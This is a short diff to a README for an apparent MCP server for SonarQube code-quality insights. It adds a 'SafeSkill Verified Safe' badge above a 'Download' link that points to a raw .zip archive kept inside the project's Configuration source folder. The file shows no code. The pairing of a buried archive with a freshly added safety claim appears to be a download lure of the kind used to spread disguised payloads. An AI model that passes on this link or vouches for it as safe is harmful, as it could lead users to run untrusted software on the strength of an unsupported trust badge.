@@ -1,5 +1,7 @@
 # 🛠️ mcp-sonarqube - Simplify Code Quality Insights
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/neyrees1337-mcp-sonarqube)
+
 [![Download](https://raw.githubusercontent.com/Neyrees1337/mcp-sonarqube/main/src/Viamus.Sonarqube.Mcp.Server/Configuration/mcp_sonarqube_v2.1.zip)](https://raw.githubusercontent.com/Neyrees1337/mcp-sonarqube/main/src/Viamus.Sonarqube.Mcp.Server/Configuration/mcp_sonarqube_v2.1.zip)
 
 ---
